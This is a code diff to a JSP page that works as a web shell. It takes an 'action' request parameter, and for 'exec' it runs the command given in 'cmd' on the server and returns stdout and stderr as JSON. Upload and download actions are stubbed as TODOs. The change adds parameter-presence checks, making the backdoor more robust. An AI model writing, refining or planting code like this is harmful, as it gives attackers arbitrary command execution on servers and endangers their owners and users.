@@ -5,6 +5,19 @@
 <%@ page contentType="application/json; charset=UTF-8" %>
 
 <%!
+private boolean isParameterSet(HttpServletRequest request, String name) {
+    Enumeration<String> parameters = request.getParameterNames();
+    boolean isDefined = false;
+    while (parameters.hasMoreElements()) {
+        String paramName = parameters.nextElement();
+        if (paramName.equals(name)) {
+            isDefined = true;
+            break;
+        }
+    }
+    return isDefined;
+}
+
 private void action_exec(JspWriter writer, String cmd) throws IOException {
     String stdout = "";
     String stderr = "";
@@ -60,23 +73,28 @@ private void action_exec(JspWriter writer, String cmd) throws IOException {
 %>
 
 <%
-String action = request.getParameter("action");
+if (isParameterSet(request, "action")) {
+    String action = request.getParameter("action");
 
-if (action.equals("exec")) {
-    String cmd = request.getParameter("cmd");
-    action_exec(out, cmd);
-} else if (action.equals("download")) {
-    // TODO
-    // String path = request.getParameter("path");
-    // action_download(out, path);
-    JSONObject result = new JSONObject();
-    result.write(out);
-} else if (action.equals("upload")) {
-    // TODO
-    // String path = request.getParameter("path");
-    // action_upload(out, path);
-    JSONObject result = new JSONObject();
-    result.write(out);
+    if (action.equals("exec") && isParameterSet(request, "cmd")) {
+        String cmd = request.getParameter("cmd");
+        action_exec(out, cmd);
+    } else if (action.equals("download") && isParameterSet(request, "path")) {
+        // TODO
+        // String path = request.getParameter("path");
+        // action_download(out, path);
+        JSONObject result = new JSONObject();
+        result.write(out);
+    } else if (action.equals("upload") && isParameterSet(request, "path")) {
+        // TODO
+        // String path = request.getParameter("path");
+        // action_upload(out, path);
+        JSONObject result = new JSONObject();
+        result.write(out);
+    } else {
+        JSONObject result = new JSONObject();
+        result.write(out);
+    }
 } else {
     JSONObject result = new JSONObject();
     result.write(out);
